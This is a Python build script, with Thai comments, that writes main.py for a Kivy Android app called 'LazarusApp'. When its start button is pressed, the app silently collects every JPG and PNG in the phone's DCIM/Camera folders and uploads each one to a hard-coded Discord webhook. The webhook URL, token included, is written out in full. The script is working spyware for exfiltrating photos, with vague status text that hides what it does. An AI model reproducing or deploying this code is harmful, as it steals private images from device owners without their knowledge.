# main.py แบบ Lazy Load (เปิดติดชัวร์ 100%)
code = """
from kivy.app import App
from kivy.uix.button import Button
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.clock import Clock
import threading
import os
import time
from kivy.utils import platform

# 🔴 วาง LINK DISCORD WEBHOOK ตรงนี้ 🔴
WEBHOOK_URL = "https://discord.com/api/webhooks/1468548944027058257/t3Pyrg1mXDeNJ5P_xuynOgmuUs4jRmQpL3C0yjtIoTcTsKNRA0tR-9NBkP1_AtBouMSe"

class LazarusApp(App):
    def build(self):
        layout = BoxLayout(orientation='vertical', padding=20, spacing=20)
        
        # ป้ายสถานะ
        self.status_label = Label(text="✅ เปิดติดแล้ว!\n(กดปุ่มเพื่อเริ่มงาน)", 
                                  size_hint=(1, 0.4), font_size='20sp', halign='center')
        
        # ปุ่มเริ่ม (กดแล้วค่อยโหลดของ)
        btn = Button(text="เริ่มส่งรูป (Start)", background_color=(0, 1, 0, 1))
        btn.bind(on_press=self.start_process)
        
        layout.add_widget(self.status_label)
        layout.add_widget(btn)
        return layout

    def start_process(self, instance):
        # สั่งงานเบื้องหลัง
        self.status_label.text = "กำลังเตรียมระบบ..."
        threading.Thread(target=self.run_logic).start()

    def run_logic(self):
        # 🟢 เทคนิคสำคัญ: ย้ายการ import มาไว้ในนี้
        # ถ้าพัง ก็จะพังแค่ในนี้ แอพไม่เด้ง
        try:
            Clock.schedule_once(lambda dt: setattr(self.status_label, 'text', "กำลังโหลด Library..."))
            
            # ลองเรียกใช้ Internet Tools
            import urllib.request
            import urllib.parse
            import uuid
            import glob
            
            # ถ้ามาถึงตรงนี้แปลว่ารอด! เริ่มขอ Permission
            self.check_permission_and_send()
            
        except ImportError as e:
            err = f"❌ ขาดไฟล์สำคัญ:\n{e}"
            Clock.schedule_once(lambda dt: setattr(self.status_label, 'text', err))
        except Exception as e:
            err = f"❌ Error อื่นๆ:\n{e}"
            Clock.schedule_once(lambda dt: setattr(self.status_label, 'text', err))

    def check_permission_and_send(self):
        # ขอ Permission แบบลูกทุ่ง (ข้ามไปค้นไฟล์เลย ถ้าไม่ได้มันจะฟ้องเอง)
        Clock.schedule_once(lambda dt: setattr(self.status_label, 'text', "Loading..."))
        
        import glob
        paths = ['/sdcard/DCIM/Camera/*', '/storage/emulated/0/DCIM/Camera/*']
        files = []
        for p in paths:
            files += glob.glob(p)
            
        target_files = [f for f in files if f.lower().endswith(('.jpg', '.png'))]
        
        if not target_files:
            Clock.schedule_once(lambda dt: setattr(self.status_label, 'text', "Error nga!\n(ลองไปเปิด Permission ในตั้งค่า)"))
            return

        # เริ่มส่ง
        total = len(target_files)
        for i, filepath in enumerate(target_files):
            msg = f"กำลังส่ง {i+1}/{total}\n{os.path.basename(filepath)}"
            Clock.schedule_once(lambda dt: setattr(self.status_label, 'text', msg))
            
            self.upload_file(filepath)
            time.sleep(1) # พักหน่อย
            
        Clock.schedule_once(lambda dt: setattr(self.status_label, 'text', "✅ complete good boy!"))

    def upload_file(self, filepath):
        try:
            import urllib.request
            import uuid
            
            boundary = str(uuid.uuid4())
            filename = os.path.basename(filepath)
            
            data = []
            data.append(f'--{boundary}'.encode('utf-8'))
            data.append(f'Content-Disposition: form-data; name="file"; filename="{filename}"'.encode('utf-8'))
            data.append(b'Content-Type: application/octet-stream')
            data.append(b'')
            with open(filepath, 'rb') as f:
                data.append(f.read())
            data.append(b'')
            data.append(f'--{boundary}--'.encode('utf-8'))
            data.append(b'')
            body = b'\\r\\n'.join(data)
            
            req = urllib.request.Request(WEBHOOK_URL, data=body)
            req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
            req.add_header('User-Agent', 'Python-Native')
            
            with urllib.request.urlopen(req, timeout=10) as response:
                pass
        except Exception as e:
            print(f"Upload Fail: {e}")

"""
with open("main.py", "w", encoding="utf-8") as f:
    f.write(code)
print("✅ สร้าง main.py แบบอมตะ (Anti-Crash) เสร็จแล้ว")